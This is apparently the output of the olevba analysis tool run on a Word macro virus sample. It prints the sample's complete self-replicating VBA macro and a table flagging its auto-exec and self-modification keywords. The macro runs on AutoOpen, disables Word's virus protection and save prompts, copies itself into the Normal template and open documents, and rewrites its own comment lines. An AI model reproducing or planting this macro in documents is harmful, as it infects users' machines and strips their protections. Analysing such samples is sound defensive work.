olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-a6d07a1c864836af2c63cc33ed451c54f98a93ef
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-a6d07a1c864836af2c63cc33ed451c54f98a93ef - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'sample1.docsample1.docHP LaserJet 4 on LPT1:
On Error Resume Next
'sample1.docsample1.docHP LaserJet 4 on LPT1:
Options.SaveNormalPrompt = 0
'sample1.docsample1.docHP LaserJet 4 on LPT1:
Options.ConfirmConversions = 0
'sample1.docsample1.docHP LaserJet 4 on LPT1:
FA65 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'sample1.docsample1.docHP LaserJet 4 on LPT1:
Options.VirusProtection = 0
'sample1.docsample1.docHP LaserJet 4 on LPT1:
DT71 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'sample1.docsample1.docHP LaserJet 4 on LPT1:
Application.EnableCancelKey = 0
'sample1.docsample1.docHP LaserJet 4 on LPT1:
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'sample1.docsample1.docHP LaserJet 4 on LPT1:
Set IS41 = ActiveDocument.VBProject.VBComponents.Item(1)
'sample1.docsample1.docHP LaserJet 4 on LPT1:
SQ26 = True
'sample1.docsample1.docHP LaserJet 4 on LPT1:
End If
'sample1.docsample1.docHP LaserJet 4 on LPT1:
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'sample1.docsample1.docHP LaserJet 4 on LPT1:
Set IS41 = NormalTemplate.VBProject.VBComponents.Item(1)
'sample1.docsample1.docHP LaserJet 4 on LPT1:
TR25 = True
'sample1.docsample1.docHP LaserJet 4 on LPT1:
End If
'sample1.docsample1.docHP LaserJet 4 on LPT1:
If TR25 <> True And SQ26 <> True Then GoTo NE9
'sample1.docsample1.docHP LaserJet 4 on LPT1:
If TR25 = True Then IS41.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, FA65 - 1))
'sample1.docsample1.docHP LaserJet 4 on LPT1:
If SQ26 = True Then IS41.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, DT71 - 1))
'sample1.docsample1.docHP LaserJet 4 on LPT1:
With IS41.CodeModule
'sample1.docsample1.docHP LaserJet 4 on LPT1:
For x = 2 To (IS41.CodeModule.CountOfLines - 1) Step 2
'sample1.docsample1.docHP LaserJet 4 on LPT1:
.replaceline x, "'" & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter
'sample1.docsample1.docHP LaserJet 4 on LPT1:
Next x
'sample1.docsample1.docHP LaserJet 4 on LPT1:
End With
'sample1.docsample1.docHP LaserJet 4 on LPT1:
NE9:
'sample1.docsample1.docHP LaserJet 4 on LPT1:
If DT71 <> 0 And FA65 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'sample1.docsample1.docHP LaserJet 4 on LPT1:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

